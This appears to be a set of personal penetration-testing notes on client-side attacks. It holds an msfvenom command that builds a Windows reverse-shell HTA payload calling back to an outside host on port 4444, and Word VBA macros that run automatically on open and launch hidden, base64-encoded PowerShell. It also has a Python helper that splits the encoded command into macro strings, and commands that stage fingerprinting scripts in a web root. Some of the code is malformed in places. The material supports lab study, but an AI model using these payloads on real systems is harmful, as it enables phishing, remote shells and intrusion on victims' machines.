
sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip
sudo unzip master.zip
sudo mv fingerprintjs2-master/ fp

below version 2.1.4 worked

cd /var/www/html/ && sudo wget https://github.com/fingerprintjs/fingerprintjs/archive/2.1.4.zip && sudo unzip 2.1.4.zip && sudo mv fingerprintjs-2.1.4/ fp/ && cd fp

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.175 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

The first argument, -nop, is shorthand for -NoProfile,347 which instructs PowerShell not to load the PowerShell user profile.
When PowerShell is started, it will, by default, load any existing user’s profile scripts, which might negatively impact the execution of our code. This option will avoid that potential issue.
Next, our script uses -w hidden (shorthand for -WindowStyle348 hidden) to avoid creating a window on the user’s desktop.
Finally, the extremely important -e flag (shorthand for -EncodedCommand) allows us to supply a Base64 encoded349 PowerShell script directly as a command line argument.

##Macro
```
Sub AutoOpen() MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro() CreateObject("Wscript.Shell").Run "cmd"
End Sub
```
#### Python script

```
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
n = 50
for i in range(0, len(str), n):
print "Str = Str + " + '"' + str[i:i+n] + '"'

```

```
Sub AutoOpen() MyMacro
End Sub
Sub Document_Open() MyMacro
End Sub
Sub MyMacro()
Dim Str As String
Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB" 
Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A" 

CreateObject("Wscript.Shell").Run Str End Sub

```
view-> macro
insert-> object

```

START cmd.exe
START powershell.exe -nop -w hidden -e JAB....

```
